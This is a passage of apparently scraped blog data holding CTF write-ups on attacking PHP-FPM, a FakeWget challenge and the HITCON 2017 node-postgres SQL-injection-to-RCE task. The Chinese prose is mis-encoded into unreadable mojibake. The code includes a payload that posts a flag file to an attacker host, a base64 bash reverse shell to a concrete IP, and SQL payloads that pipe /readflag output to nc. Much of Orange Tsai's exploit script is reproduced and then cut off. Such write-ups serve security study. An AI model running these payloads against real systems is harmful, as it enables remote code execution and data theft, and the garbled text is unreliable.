ä¸Š.soä¹Ÿè¢«å†™å…¥ï¼ˆæˆ‘åˆ°dockerä¸Šçœ‹äº†ï¼‰ï¼Œé‚£ä¹ˆ.soä¸€å®šä¼šåœ¨phpæ‰§è¡Œæ—¶è¢«è§¦å‘ï¼Œä¸€å®šæ˜¯å¯ä»¥æ‰§è¡Œ.soä¸­æˆ‘ä»¬å†™çš„å‘½ä»¤çš„ï¼›ä½†æ˜¯ç°åœ¨ç«Ÿç„¶è¿scandir(\u0026rsquo;/\u0026rsquo;)éƒ½åªèƒ½æ‰§è¡Œä¸€æ¬¡ ï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿåé¢å°±éƒ½å¤±è´¥äº†ï¼Œæ›´ä¸è¦è¯´.soä¸­çš„å‘½ä»¤äº†ï¼Œè‚¯å®šæ›´æ˜¯æ²¡æœ‰æ‰§è¡Œ\nä¹‹ååˆå°è¯•äº†å¾ˆå¤šæ¬¡ï¼Œ.soæ­£å¸¸ä¸Šä¼ ï¼Œæœ€å¼€å§‹æ‰“å‘fpmçš„æµé‡ä¹Ÿåˆæ‰“äº†å‡ éï¼Œå¤±è´¥ï¼›å†ä¹‹å.soä¹Ÿä¸èƒ½æ­£å¸¸ä¸Šä¼ äº†ï¼Œæœ€åˆçš„é‚£ä¸ªæµé‡ä¹Ÿæ‰“ä¸æˆäº†ï¼Œåªèƒ½å›æ˜¾int(xxx)ï¼Œä½†æ˜¯æ²¡æœ‰eval()çš„å›æ˜¾ï¼Œè¯´æ˜è¿˜æ˜¯ä¸æ­£å¸¸ï¼Œç„¶åä»–å¦ˆçš„ï¼Œé—´æˆ–æœ‰ä¸€ä¸¤æ¬¡èƒ½æˆåŠŸï¼Œç”šè‡³æˆ‘éƒ½åˆåœ¨/tmpç›®å½•ä¸‹å†™äº†åˆ«çš„æ–‡ä»¶ï¼ˆå¦‚æœå‰é¢çš„æµé‡æ²¡æ­£å¸¸æ‰“å‡ºå»çš„è¯æ˜¯ç»å¯¹ä¸å¯èƒ½åšåˆ°çš„ï¼Œè‚¯å®šæ˜¯bool(false)ï¼‰ï¼Œä½†æ˜¯ä½†æ˜¯ä½†æ˜¯åˆæ˜¯ä¸€ç§’ç ´åŠŸï¼ŒçœŸæ˜¯ä¸ç†è§£äº†ï¼Œå®Œå…¨æ˜¯è·Ÿå‰é¢ä¸€æ¨¡ä¸€æ ·çš„payloadï¼Œä½†æ˜¯å°±ä»–å¦ˆç„å­¦ï¼Œåäº†\nä¸æƒ³å†è€—å¤ªå¤šæ—¶é—´åœ¨è¿™ä¸ªé¢˜ä¸Šäº†ï¼Œå®åœ¨æ˜¯ç»·ä¸ä½äº†ï¼ˆè°ƒäº†å¿«1å¤©äº†ï¼‰ï¼ŒåŸºæœ¬ä¹Ÿç®—æ˜¯æ‰“é€šäº†ï¼ˆæ¯•ç«Ÿå°±å·®ä¸€ç‚¹ç‚¹å•Šå•Šå•Šå•Šå•Š æˆ‘æˆªå›¾è¿˜æœ‰å‘¢ï¼‰ï¼ˆå…¶å®æ˜¯æ‡’çš„é‡ç½®dockerå†å°è¯•äº† æˆ‘çš„ï¼‰ï¼Œæˆ‘çŒœæµ‹å‡ºé”™çš„ç‚¹åœ¨äºé‚£ä¸ªå¼€åœ¨46819ç«¯å£çš„ftpæœåŠ¡å™¨ä¸ç¨³å®šï¼Œå®ƒåœ¨å¤„ç†è¿™è¾¹ftpæ‰“å‡ºçš„æµé‡æ—¶å¯èƒ½æ²¡æœ‰æ­£å¸¸çš„å¤„ç†ï¼Œå†åŠ ä¸Šæ¥å›è°ƒæ•´payloadæ‰“äº†å¤ªå¤šæ¬¡äº†ï¼Œå¯èƒ½ä¹‹å‰çš„é”™è¯¯ç´¯ç§¯åˆ°åé¢ï¼Œæ¯”å¦‚æŸæ¬¡æ²¡æœ‰urlencodeä¹‹ç±»çš„ï¼Œæå¾—ç¯å¢ƒä¹Ÿä¸æ­£å¸¸äº†\n***[è“å¸½æ¯ 2021]One Pointer PHP yysyï¼Œç¡®å®æ²¡æ—¶é—´å¤ç°ï¼ˆå¤ç°èµµæ€»çš„é¢˜è®©æˆ‘æœ‰å¿ƒç†é˜´å½±äº†ï¼‰\næˆ‘å°±å…ˆäº‘ä¸€ä¸‹ï¼Œå¯¹8èµ·\nå‚è€ƒï¼šwp1 | wp2\næ”»å‡»unix socketæ¨¡å¼ä¸‹çš„php-fpm ç”±äºunix socketæ˜¯è¯»å–/run/php/php7.4-fpm.sockè¿›è¡Œå†…éƒ¨é€šä¿¡ï¼Œé‚£å¿…ç„¶æ˜¯ä¸èƒ½æ‰“è¿œç¨‹ï¼Œç”¨çš„æ˜¯stream_socket_clientå»ºç«‹ä¸€ä¸ªunix socketè¿æ¥ï¼Œç„¶åå†™å…¥tcpæµæ¥é€šä¿¡\n\u0026lt;?php $sock=stream_socket_client(\u0026#39;unix:///run/php/php7.3-fpm.sock\u0026#39;);fputs($sock,base64_decode($_POST[\u0026#39;A\u0026#39;]));var_dump(fread($sock, 4096));?\u0026gt; [*CTF 2019]Echohub å‰é¢çš„pwnéƒ¨åˆ†æˆ‘æ˜¯ä¸å¤ªèƒ½çœ‹æ‡‚ï¼ˆè‡³å°‘ç›®å‰ï¼‰ï¼Œå°±ç®€å•è¯´è¯´åé¢çš„webéƒ¨åˆ†ï¼›è¿™é‡Œæ˜¯å‚è€ƒwp\nä»phpinfoå¯ä»¥çœ‹åˆ°disable_functions\nfile_get_contents,file_put_contents,fwrite,file,chmod,chown,copy,link,fflush,mkdir,popen,rename,touch,unlink,pcntl_alarm,move_upload_file,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,fsockopen,pfsockopen,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,curl_init,curl_exec,curl_multi_init,curl_multi_exec,dba_open,dba_popen,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,mail,dl,putenv è€ƒè™‘ç”¨create_functionæ¥rceï¼Œä¸è¿‡è¿˜æ˜¯ç»•ä¸è¿‡disable_functionsæ¥æ‰§è¡Œ/readflag\nä¸è¿‡è·‘ä¸€ä¸‹ç»™å‡ºçš„dockerï¼Œå¯ä»¥çœ‹åˆ°ç”¨unix socketæ¨¡å¼è¿è¡Œçš„php-fpm\né¢˜ç›®ç¯å¢ƒå®‰è£…äº†apacheæœåŠ¡å™¨å’Œapache-moduleæ¨¡å¼çš„phpæ¨¡å—ï¼ˆè¿™ä¸ªå°±æ˜¯é¢˜ç›®ç¯å¢ƒï¼‰ï¼Œä½†æ˜¯fpmä¹Ÿå®‰è£…äº†å¹¶ä¸”å¯åŠ¨\nfpmæ¨¡å¼çš„php.iniä¸phpinfoä¸­æ˜¾ç¤ºçš„ä¸åŒï¼Œæ˜¯ç‹¬ç«‹çš„ï¼Œdisable_funtcionsçš„é™åˆ¶å®½æ¾å¾ˆå¤šï¼Œæˆ‘ä»¬æ¥æ‰“å®ƒæ¥rceï¼Œexpå°±æ˜¯ä¸Šé¢é‚£ä¸ª\næ‹–æ‹–æ‹‰æ‹‰å››äº”å¤©ï¼Œæ€»ç®—æ˜¯æŠ½ç©ºç»™æ€»ç»“å®Œäº†ï¼Œå¯¹åšé¢˜å’Œå­¦ä¹ æ–¹é¢åˆæœ‰äº†ä¸€äº›èˆ¹æ–°çš„ç†è§£ï¼Œè¿˜æ˜¯æœ‰å¾ˆå¤šæ”¶è·çš„\nä»¥ä¸‹æ˜¯æœ¬æ–‡ä¸­æ¶‰åŠåˆ°çš„ å’Œæˆ‘å­¦ä¹ æ—¶çœ‹è¿‡çš„æ‰€æœ‰æ–‡ç« çš„é“¾æ¥ æ¯æ—¥æ„Ÿè°¢äº’è”ç½‘çš„ä¸°å¯Œèµ„æºï¼ˆ fastcgiåè®®åˆ†æä¸å®ä¾‹ | php-fpm ä¸ Nginxä¼˜åŒ–æ€»ç»“\nPHP è¿æ¥æ–¹å¼ \u0026amp; PHP-FPMæœªæˆæƒè®¿é—®æ¼æ´ \u0026amp; *CTF echohub\næµ…æphp-fpmçš„æ”»å‡»æ–¹å¼\nFastcgiåè®®åˆ†æ \u0026amp;\u0026amp; PHP-FPMæœªæˆæƒè®¿é—®æ¼æ´ \u0026amp;\u0026amp; Expç¼–å†™\nã€æŠ€æœ¯åˆ†äº«ã€‘æ·±å…¥ FTP æ”»å‡» php-fpm ç»•è¿‡ disable_functions\nä¸€ç‚¹å¯¹è¿‘å†µçš„ç¢ç¢å¿µ æœ€è¿‘æœ‰ç‚¹è‡ªé—­ï¼Œçœ‹ç€é‚£ä¹ˆå¤šå’Œæˆ‘å­¦ä¹ æ—¶é—´å·®ä¸å¤šçš„å¸ˆå‚…éƒ½å·²ç»ç›¸å½“ç›¸å½“å‰å®³äº†ï¼Œæˆ‘è¿˜æ˜¯è·Ÿåˆšå¼€å§‹ä¸€æ ·èœï¼Œæ»¡æ‰“æ»¡ç®—å­¦äº†ä¹ŸåŠå¹´å¤šäº†ï¼Œæ€ä¹ˆå°±è¿™ä¹ˆèœå‘¢ï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿå·®è·å¤ªå¤§äº†ï¼Œä»–å¦ˆçš„å°±æ˜¯èœå•Š\nçœ‹çœ‹åˆ«äººåšå®¢éƒ½å†™å¾—å•¥ï¼Œcveå¤ç°ï¼Œæ¼æ´æŒ–æ˜ï¼Œæ¸—é€å®æˆ˜ï¼Œå®‰å…¨ç ”ç©¶ï¼Œæˆ‘å‘¢ï¼Ÿå…¨æ˜¯äº’è”ç½‘æ¹¿åƒåœ¾ï¼Œæ²¡ä¸€ç‚¹å«é‡‘é‡ï¼Œå°±ä¼šå†™ä¸€ç‚¹wpï¼Œè¿˜å¤§å¤šéƒ½æ˜¯å‚è€ƒäº†åˆ«äººçš„å†…å®¹ï¼Œç„¶åå†™ä¸€ç‚¹çŸ¥è¯†æ€»ç»“ï¼Œè·Ÿä¸ªå°å­¦ç”Ÿä¸€æ ·\nè¿™å‘¨ä¸‹äº†å†³å¿ƒæŠŠæ²¡ç”¨çš„è¯¾çš„å‡è¯·æ‰äº†ï¼Œå¸Œæœ›è‡ªå·±èƒ½å¥½å¥½åˆ©ç”¨èµ·æ¥ï¼Œåˆ«æ‘†äº†ï¼ŒçœŸåˆ«æ‘†äº†ï¼Œè¦å‡ºå¤§é—®é¢˜\nä¸è¿‡æ€»ç»“æ˜¯å¾ˆæœ‰å¿…è¦çš„ï¼Œç°åœ¨çš„è¿›åº¦æ˜¯è¿™æ ·ï¼š\nphpååºåˆ—åŒ–ï¼šç¼º åŸç”Ÿç±»çš„å­¦ä¹ +è·Ÿä¸€äº›å®é™…çš„é“¾å­ pythonååºåˆ—åŒ–ï¼šå®Œ sqliï¼šå·®ä¸å¤šå®Œï¼Œè¿˜å¾—å¤šåšç‚¹é¢˜åŠ æ·±ç†è§£ SSTIï¼šå®Œ æ–‡ä»¶ä¸Šä¼ ï¼šä¹‹å‰9æœˆæ€»ç»“åˆ°ä¸€åŠå»æ‰“hvväº† php-fpmï¼šå®Œ GraphQLï¼šå®Œ å¾ˆè–„å¼±çš„åœ°æ–¹éƒ½è¿˜æ²¡æŒæ¡ï¼ˆè¿™ä¸æ˜¯åºŸè¯ï¼‰ï¼Œå‡ ä¸ªæ€¥éœ€æ€»ç»“æŒæ¡çš„ï¼š\nssrfï¼šä¸ç†Ÿç»ƒ xssï¼šåšé¢˜é‡åˆ°éƒ½æ˜¯èº²ç€èµ° jsåœ†å½¢æ±¡æŸ“ï¼šè·Ÿä¸Šé¢é‚£ä¸ªæ€»æ˜¯ä¸€èµ·å‡ºç° xxe xsleaks è¿˜æœ‰javaï¼Œè¿™ä¸ªå¿…é¡»å¾—å­¦\nä¸å¤šè¯´äº†ï¼Œå†²ï¼ï¼ï¼\n","date":"2021-11-18T00:03:25+08:00","permalink":"https://amiaaaz.github.io/2021/11/18/attack-php-fpm-study-notes/","section":"posts","tags":["PHP","php-fpm"],"title":"æ”»å‡»PHP-FPMå­¦ä¹ ç¬”è®°"},{"categories":["CTF"],"contents":"FakeWget åˆ©ç”¨shä¸‹grepå‘½ä»¤æ­£åˆ™ç¼ºé™·ç»•è¿‡æ­£åˆ™æ£€æŸ¥\nè¿™ä¸ªé¢˜ï¼Œå°±éå¸¸çš„å¯æƒœï¼Œå…·ä½“çš„å°±ä¸è¯´äº†ï¼Œå¤ªä¸¢äººäº†ï¼Œæ€»ä¹‹ååˆ†æ‹‰è·¨ï¼Œç‰¹åˆ«å¯æƒœï¼Œç©¶æä¸‹é¥­ã€‚\næ‰«ç›®å½•ï¼Œå¾—åˆ°/consoleï¼Œ/wgetï¼Œ/flagé¡µé¢å¾—åˆ°æç¤ºflagåœ¨/flag_is_here\n/wgetå¯ä»¥å‘é€urlè¿›è¡Œwgetçš„æ“ä½œï¼Œè·Ÿcurlä¸€æ ·ï¼Œä¹Ÿæ˜¯å¯ä»¥å‘é€postè¯·æ±‚æ»´ï¼Œè¿™é‡Œå¯¹è¾“å…¥çš„urlæœ‰æ£€æµ‹ï¼Œä¸å…è®¸æœ‰ç©ºæ ¼å’Œä¸€äº›ç‰¹æ®Šå­—ç¬¦\nè¿™é‡Œå…¶å®æœ‰ä¸ªåŸé¢˜[çºµæ¨ªæ¯ 2020]magic_downloadï¼Œå‡ ä¹æ˜¯ä¸€æ ·çš„ï¼Œshåœ¨grepæ—¶å¯ä»¥ç”¨æ¢è¡Œçš„æ“ä½œæ¥ç»•è¿‡\npayload\nfunction senduri() { var uri = \u0026#39;http://your_vps_ip:port/\\\\n?\\t--post-file=flag_is_here\u0026#39; var encrypt = new JSEncrypt(); publicKey = \u0026#39;-----BEGIN PUBLIC KEY-----\\ MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAoFH2atPqJOH6yezxEw9s\\ eStp0j7hN3cKKlANZpAv8RRhpDxFcob47OwkyUlsJp6tdvSJBtsJ5KCNYIomdqc7\\ +f4PJvShHatMLGBRFjUkr0aunqq9LDobEHrzwSEEX6V0V+73EdbieYxFHCz2cXaB\\ MpnIK19c+u6sgVJFjZ+oggVyKuOtOUscnzzrMhOWGl+eXk+dBe0wjSTrq84zvRI1\\ 94uTehhY/8hzZjkQavV8NWq0b7l6hJHsO7mp2tGye1npYRQ/tZCEMkzO+PaAkPf6\\ H3CyuVgbdMJcuSBJT8kBRQ6P16skZIqrY+NRmdSJmMoGgR9NYVvk8soeSj4MHRpb\\ rwIDAQAB\\ -----END PUBLIC KEY-----\u0026#39;; encrypt.setPublicKey(publicKey); encryptdata = encrypt.encrypt(uri); $.post(\u0026#34;/wget\u0026#34;, { encryptdata: encryptdata }); $.get(\u0026#34;/wget\u0026#34;, {}); } EasyWAF different cookie means node pg vuln\npay attention to the hint different cookie different means\nä»–å¦ˆçš„ ç»å…¸æ¯”èµ›ç»“æŸæ‰¾åˆ°åŸé¢˜ï¼ŒçœŸä¸€æ¨¡ä¸€æ ·ï¼Œåäº†\nhttps://github.com/orangetw/My-CTF-Web-Challenges#sql-so-hard\nhttps://github.com/orangetw/My-CTF-Web-Challenges/blob/master/hitcon-ctf-2017/sql-so-hard/exploit.py\n#!/usr/bin/node /** * @HITCON CTF 2017 * @Author Orange Tsai */ const qs = require(\u0026#34;qs\u0026#34;); const fs = require(\u0026#34;fs\u0026#34;); const pg = require(\u0026#34;pg\u0026#34;); const mysql = require(\u0026#34;mysql\u0026#34;); const crypto = require(\u0026#34;crypto\u0026#34;); const express = require(\u0026#34;express\u0026#34;); const pool = mysql.createPool({ connectionLimit: 100, host: \u0026#34;localhost\u0026#34;, user: \u0026#34;ban\u0026#34;, password: \u0026#34;ban\u0026#34;, database: \u0026#34;bandb\u0026#34;, }); const client = new pg.Client({ host: \u0026#34;localhost\u0026#34;, user: \u0026#34;userdb\u0026#34;, password: \u0026#34;userdb\u0026#34;, database: \u0026#34;userdb\u0026#34;, }); client.connect(); const KEYWORDS = [ \u0026#34;select\u0026#34;, \u0026#34;union\u0026#34;, \u0026#34;and\u0026#34;, \u0026#34;or\u0026#34;, \u0026#34;\\\\\u0026#34;, \u0026#34;/\u0026#34;, \u0026#34;*\u0026#34;, \u0026#34; \u0026#34; ] function waf(string) { for (var i in KEYWORDS) { var key = KEYWORDS[i]; if (string.toLowerCase().indexOf(key) !== -1) { return true; } } return false; } const app = express(); app.use((req, res, next) =\u0026gt; { var data = \u0026#34;\u0026#34;; req.on(\u0026#34;data\u0026#34;, (chunk) =\u0026gt; { data += chunk}) req.on(\u0026#34;end\u0026#34;, () =\u0026gt;{ req.body = qs.parse(data); next(); }) }) app.all(\u0026#34;/*\u0026#34;, (req, res, next) =\u0026gt; { if (\u0026#34;show_source\u0026#34; in req.query) { return res.end(fs.readFileSync(__filename)); } if (req.path == \u0026#34;/\u0026#34;) { return next(); } var ip = req.connection.remoteAddress; var payload = \u0026#34;\u0026#34;; for (var k in req.query) { if (waf(req.query[k])) { payload = req.query[k]; break; } } for (var k in req.body) { if (waf(req.body[k])) { payload = req.body[k]; break; } } if (payload.length \u0026gt; 0) { var sql = `INSERT INTO blacklists(ip, payload) VALUES(?, ?) ON DUPLICATE KEY UPDATE payload=?`; } else { var sql = `SELECT ?,?,?`; } return pool.query(sql, [ip, payload, payload], (err, rows) =\u0026gt; { var sql = `SELECT * FROM blacklists WHERE ip=?`; return pool.query(sql, [ip], (err,rows) =\u0026gt; { if ( rows.length == 0) { return next(); } else { return res.end(\u0026#34;Shame on you\u0026#34;); } }); }); }); app.get(\u0026#34;/\u0026#34;, (req, res) =\u0026gt; { var sql = `SELECT * FROM blacklists GROUP BY ip`; return pool.query(sql, [], (err,rows) =\u0026gt; { res.header(\u0026#34;Content-Type\u0026#34;, \u0026#34;text/html\u0026#34;); var html = \u0026#34;\u0026lt;pre\u0026gt;Here is the \u0026lt;a href=/?show_source=1\u0026gt;source\u0026lt;/a\u0026gt;, thanks to Orange\\n\\n\u0026lt;h3\u0026gt;Hall of Shame\u0026lt;/h3\u0026gt;(delete every 60s)\\n\u0026#34;; for(var r in rows) { html += `${parseInt(r)+1}. ${rows[r].ip}\\n`; } return res.end(html); }); }); app.post(\u0026#34;/reg\u0026#34;, (req, res) =\u0026gt; { var username = req.body.username; var password = req.body.password; if (!username || !password || username.length \u0026lt; 4 || password.length \u0026lt; 4) { return res.end(\u0026#34;Bye\u0026#34;); } password = crypto.createHash(\u0026#34;md5\u0026#34;).update(password).digest(\u0026#34;hex\u0026#34;); var sql = `INSERT INTO users(username, password) VALUES(\u0026#39;${username}\u0026#39;, \u0026#39;${password}\u0026#39;) ON CONFLICT (username) DO NOTHING`; return client.query(sql.split(\u0026#34;;\u0026#34;)[0], (err, rows) =\u0026gt; { if (rows \u0026amp;\u0026amp; rows.rowCount == 1) { return res.end(\u0026#34;Reg OK\u0026#34;); } else { return res.end(\u0026#34;User taken\u0026#34;); } }); }); app.listen(31337, () =\u0026gt; { console.log(\u0026#34;Listen OK\u0026#34;); }); æ¶‰åŠåˆ°çš„ä¸»è¦çŸ¥è¯†ç‚¹æœ‰ä¸‰ä¸ªï¼Œä¸€ä¸ªä¸€ä¸ªè¯´ã€‚\nCVE-2017-16082: node-progresql-rce å‚è€ƒï¼šnode.js + postgres ä»æ³¨å…¥åˆ°Getshell | vulhub: node/CVE-2017-16082 | PostgreSQL è®¤è¯æ–¹å¼è¯¦è§£\ndockerä¸­çš„ç¤ºä¾‹app.jsï¼Œä¹‹åè¿ä¸Šdockerä¸­çš„app.jsç”¨vscodeè¿œç¨‹è°ƒè¯•\nconst Koa = require(\u0026#39;koa\u0026#39;) const { Client } = require(\u0026#39;pg\u0026#39;) const app = new Koa() const client = new Client({ user: \u0026#34;postgres\u0026#34;, password: \u0026#34;postgres\u0026#34;, database: \u0026#34;example\u0026#34;, host: \u0026#34;db\u0026#34;, port: 5432 }) client.connect() app.use(async ctx =\u0026gt; { ctx.response.type = \u0026#39;html\u0026#39; let id = ctx.request.query.id || 1 let sql = `SELECT * FROM \u0026#34;user\u0026#34; WHERE \u0026#34;id\u0026#34; = ${id}` const res = await client.query(sql) ctx.body = `\u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;table\u0026gt; \u0026lt;tr\u0026gt;\u0026lt;th\u0026gt;id\u0026lt;/th\u0026gt;\u0026lt;td\u0026gt;${res.rows[0].id}\u0026lt;/td\u0026gt;\u0026lt;/tr\u0026gt; \u0026lt;tr\u0026gt;\u0026lt;th\u0026gt;name\u0026lt;/th\u0026gt;\u0026lt;td\u0026gt;${res.rows[0].name}\u0026lt;/td\u0026gt;\u0026lt;/tr\u0026gt; \u0026lt;tr\u0026gt;\u0026lt;th\u0026gt;score\u0026lt;/th\u0026gt;\u0026lt;td\u0026gt;${res.rows[0].score}\u0026lt;/td\u0026gt;\u0026lt;/tr\u0026gt; \u0026lt;/table\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt;` }) app.listen(3000) æ˜¾ç„¶17è¡Œçš„let sql = è¯­å¥æœ‰sqlçš„å¯èƒ½ï¼Œä¸è¿‡æ³¨æ„è¿™é‡Œçš„å¯æ§å‚æ•°åœ¨whereä¹‹åè€Œä¸åœ¨selectä¹‹åï¼Œæˆ‘ä»¬æ²¡æ³•è½»æ˜“çš„æ§åˆ¶å­—æ®µåï¼Œå³ä½¿æ˜¯ç”¨è”åˆæŸ¥è¯¢\nselect * from \u0026#34;user\u0026#34; where id=-1 union slect 1,2,3 as \u0026#34;\\\\\u0026#39;+console.log(process.enc)]=null;//\u0026#34; ç¬¬äºŒä¸ªselectåçš„å­—æ®µåä¹Ÿä¸ä¼šè¢«postgresè¿”å›ï¼Œåªä¼šå›æ˜¾ç¬¬ä¸€ä¸ªæŸ¥è¯¢ç»“æœ\nä½†æ˜¯æˆ‘ä»¬å¯ä»¥ç›´æ¥æ‰§è¡Œå¤šè¯­å¥\n/?id=1;select+1+as+\u0026#34;\\\u0026#39;+console.log(process.env)]=null;//\u0026#34; ä¼šè¿”å›500ï¼Œä½†æ˜¯å·²ç»è¢«æ­£å¸¸æ‰§è¡Œè¯­å¥äº†ï¼Œæ‰“å°å‡ºäº†ç¯å¢ƒå˜é‡\nåŸç†å‘¢ï¼Œå°±æ˜¯ç»å…¸çš„è½¬ä¹‰ä¸å…¨\nvar inlineParser = function (fieldName, i) { return \u0026#34;\\nthis[\u0026#39;\u0026#34; + // fields containing single quotes will break // the evaluated javascript unless they are escaped // see https://github.com/brianc/node-postgres/issues/507 // Addendum: However, we need to make sure to replace all // occurences of apostrophes, not just the first one. // See https://github.com/brianc/node-postgres/issues/934 fieldName.replace(/\u0026#39;/g, \u0026#34;\\\\\u0026#39;\u0026#34;) + \u0026#34;\u0026#39;] = \u0026#34; + \u0026#39;rowData[\u0026#39; + i + \u0026#39;] == null ? null : parsers[\u0026#39; + i + \u0026#39;](rowData[\u0026#39; + i + \u0026#39;]);\u0026#39; } fileNameå°±æ˜¯å­—æ®µåï¼Œåªå¯¹å•å¼•å·å‰åŠ åæ–œæ fileName.replace(/'/g, \u0026quot;\\\\'\u0026quot;)ï¼Œæˆ‘ä»¬åªè¦å†åŠ ä¸€ä¸ªåæ–œæ å°±èƒ½é€ƒé€¸äº†ï¼Œæ‰€ä»¥æˆ‘ä»¬å°±æœ‰äº†å¯æ§çš„å­—æ®µå\næˆ‘ä»¬ä¸Šé¢çš„payloadä¼ å…¥ä¹‹åä¼šæ˜¯è¿™æ ·\n\u0026#39;SELECT * FROM \u0026#34;user\u0026#34; WHERE \u0026#34;id\u0026#34; = 1;select 1 as \u0026#34;\\\\\u0026#39; console.log(process.env)]=null;//\u0026#34;\u0026#39; è¯¶ï¼Œé—­åˆäº†ï¼›å¦‚æœåœ¨ä¸­é—´è§£æçš„åœ°æ–¹ä¸‹æ–­ç‚¹ï¼Œå¯ä»¥çœ‹åˆ°ä¼ å…¥Functionç±»çš„å‡½æ•°ä½“ctorBodyå€¼ä¸º\nthis[\u0026#39;\\\\\u0026#39;+console.log(process.env)]=null;//\u0026#39;] = rowData[0] == null ? null : parsers[0](rowData[0]); ç¡®å®ï¼Œæ‰§è¡Œçš„å°±æ˜¯æˆ‘ä»¬çš„æ¶æ„è¯­å¥\næ„é€ åå¼¹shellçš„pocï¼Œæ‰§è¡Œå³å¯åå¼¹shellï¼ˆä¸æˆåŠŸçš„è¯è®°å¾—æŠŠurlencodeçš„special charså‹¾ä¸Šï¼‰\n/?id=1;SELECT 1 AS \u0026#34;\\\u0026#39;]=0;require=process.mainModule.constructor._load;/*\u0026#34;, 2 AS \u0026#34;*/p=require(`child_process`);/*\u0026#34;, 3 AS \u0026#34;*/p.exec(`echo YmFzaCAtaSA+JiAvZGV2L3Rj`+/*\u0026#34;, 4 AS \u0026#34;*/`cC8xMDEuMzUuMTE0LjEwNy84NDI2IDA+JjE=|base64 -d|bash`)//\u0026#34; å…¶ä¸­æ ¸å¿ƒpayloadåˆ†å‰²åç”¨b64ç¼–ç +åå¼•å·æ¥æ‰§è¡Œè¯­å¥ï¼›Functionç¯å¢ƒä¸‹æ²¡æœ‰require()å‡½æ•°ï¼Œä¸èƒ½è·å¾—child_processæ¨¡å—ï¼Œä½¿ç”¨process.mainModule.constructor._loadæ¥ä»£æ›¿require\nä¿®å¤æ–¹æ³•æ˜¯å°†fileName.replace(/'/g, \u0026quot;\\\\'\u0026quot;)ä¿®æ”¹ä¸ºescape(fileName)ï¼Œå¯¹å¤§éƒ¨åˆ†æœ‰é—®é¢˜å­—ç¬¦è¿›è¡Œè½¬ä¹‰\nmysqlçš„max_allowed_packet é»˜è®¤æœ€å¤§16Mï¼Œè¶…è¿‡åˆ™å…³é—­è¿æ¥ä¸æ‰§è¡Œsqlè¯­å¥ï¼Œä¸ä¼šæŠŠæˆ‘ä»¬æ­¤æ¬¡æŸ¥è¯¢çš„è®°å½•ä¿ç•™ä¸‹æ¥ï¼Œå¯ä»¥ç»•è¿‡waf\npostgresqlç‰¹æ®Šè¯­å¥ ç‰¹æ€§ï¼šæ”¯æŒå°†16è¿›åˆ¶çš„å€¼è½¬æ¢ä¸ºunicodeå­—ç¬¦ï¼Œå¹¶ä¸”å¯ä»¥è‡ªå®šä¹‰è½¬ä¹‰ç¬¦\nåˆ©ç”¨è¿™ä¸€ç‚¹å¯ä»¥ç»•wafï¼Œç©ºæ ¼ç”¨\\tç»•è¿‡ï¼Œè‡ªå®šä¹‰è½¬ä¹‰ç¬¦è®¾ä¸ºæ„Ÿå¹å·\n\u0026#39;,\u0026#39;\u0026#39;)\\tON\\tCONFLICT\\t(username)\\tDO\\tUPDATE\\tSET\\tusername=\u0026#39;\u0026#39;\\tRETURNING\\t1\\tAS\\tU\u0026amp;\u0026#34;!005c!0027+(r=process.mainModule.require,l=!0022!0022)]!002f!002f\u0026#34;\\tUESCAPE\\t\u0026#39;!\u0026#39;,\\t1\\tAS\\tU\u0026amp;\u0026#34;!005c!0027+(l+=!0022!002freadflag|nc!0020123.123!0022)]!002f!002f\u0026#34;\\tUESCAPE\\t\u0026#39;!\u0026#39;,\\t1\\tAS\\tU\u0026amp;\u0026#34;!005c!0027+(l+=!0022.123.123!00201234!0022)]!002f!002f\u0026#34;\\tUESCAPE\\t\u0026#39;!\u0026#39;,\\t1\\tAS\\tU\u0026amp;\u0026#34;!005c!0027+(r(!0022child_process!0022).execSync(l))]!002f!002f\u0026#34;\\tUESCAPE\\t\u0026#39;!\u0026#39;; è¿™é“é¢˜çš„sqlæ³¨å…¥ç‚¹åœ¨updateä¹‹å\nINSERT INTO users(username, password) VALUES(\u0026#39;${username}\u0026#39;, \u0026#39;${password}\u0026#39;) ON CONFLICT (username) DO NOTHING ä¸€æ ·çš„æ€è·¯ï¼Œå…ˆé—­åˆï¼Œåœ¨æ„é€ æ­£å¸¸çš„jsè¯­å¥\n\u0026#34;\u0026#34;\u0026#39;,\u0026#39;\u0026#39;)/*%s*/returning(1)as\u0026#34;\\\\\u0026#39;/*\u0026#34;,(1)as\u0026#34;\\\\\u0026#39;*/-(a=`child_process`)/*\u0026#34;,(2)as\u0026#34;\\\\\u0026#39;*/-(b=`/readflag|nc 10.188.2.20 9999`)/*\u0026#34;,(3)as\u0026#34;\\\\\u0026#39;*/-console.log(process.mainModule.require(a).exec(b))]=1//\u0026#34;--\u0026#34;\u0026#34; è¿˜å¾—ç»“åˆä¸€ä¸‹å‰é¢é‚£ä¸ª16Mçš„æº¢å‡º\nstr(randint(1, 65535))+str(randint(1, 65535))+str(randint(1, 65535)) æœ€åæ˜¯å®Œæ•´çš„expï¼Œæ¥è‡ªäºorangeä½¬\nfrom random import randint import requests # payload = \u0026#34;union\u0026#34; payload = \u0026#34;\u0026#34;\u0026#34;\u0026#39;,\u0026#39;\u0026#39;)/*%s*/returning(1)as\u0026#34;\\\\\u0026#39;/*\u0026#34;,(1)as\u0026#34;\\\\\u0026#39;*/-(a=`child_process`)/*\u0026#34;,(2)as\u0026#34;\\\\\u0026#39;*/-(b=`/readflag|nc 10.188.2.20 9999`)/*\u0026#34;,(3)as\u0026#34;\\\\\u0026#39;*/-console.log(process.mainModule.require(a).exec(b))]=1//\u0026#34;--\u0026#34;\u0026#34;\u0026#34; % (\u0026#39; \u0026#39;*1024*1024*16) username = str(randint(1, 65535))+str(randint(1, 65535))+str(randint(1, 65535)) data = { 